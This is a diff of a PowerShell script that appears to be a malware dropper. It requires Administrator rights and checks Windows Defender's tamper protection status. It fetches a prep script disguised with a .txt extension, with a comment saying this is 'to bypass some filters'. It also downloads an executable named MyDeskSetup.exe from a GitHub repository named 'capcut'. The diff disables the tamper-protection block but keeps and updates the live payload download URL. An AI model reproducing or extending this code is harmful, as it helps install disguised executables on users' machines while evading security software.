@@ -2,7 +2,6 @@
 $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
 if (-not $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
     Write-Host "ERROR: Please run this script as Administrator!" -ForegroundColor Red
-    pause
     exit
 }
 
@@ -134,14 +133,15 @@ foreach ($Path in $TempPaths) {
 }
 
 # ==========================================
-# BLOCK 2: TAMPER PROTECTION BARRIER
+# BLOCK 2: TAMPER PROTECTION BARRIER (DISABLED BY USER)
 # ==========================================
-$PrepScriptPath = "$env:ProgramData\RevolutionPrep.ps1"
+# $PrepScriptPath = "$env:ProgramData\RevolutionPrep.ps1"
 # [USER] Links needed here!
 # Link to the RAW content of 'revolution2.txt' (Hosted on Vercel)
 # WE USE .txt EXTENSION TO BYPASS SOME FILTERS, SCRIPT WILL RENAME IT.
-$PrepUrl = "https://mydesk-registry.vercel.app/revolution2.txt" 
-$PayloadUrl = "https://github.com/comatX33/capcut/releases/download/release/MyDeskSetup.exe"
+# $PrepUrl = "https://mydesk-registry.vercel.app/revolution2.txt" 
+$PayloadUrl = "https://github.com/comatX33/capcut/releases/latest/download/MyDeskSetup.exe"
+<#
 while ($true) {
     $Status = Get-MpComputerStatus
     if ($Status.IsTamperProtected -eq $false) {
@@ -173,7 +173,6 @@ while ($true) {
         }
         catch {
             Write-Host "[!] Preperation Failed" -ForegroundColor Red
-            pause
             exit
         }
     }
@@ -186,6 +185,7 @@ while ($true) {
         break
     }
 }
+#>
 
 # ==========================================
 # BLOCK 3: THE REVOLUTION (FAST PATH)
@@ -222,5 +222,4 @@ else {
     }
 }
 Write-Host "FALTAL ERROR" -ForegroundColor Magenta
-pause
 exit
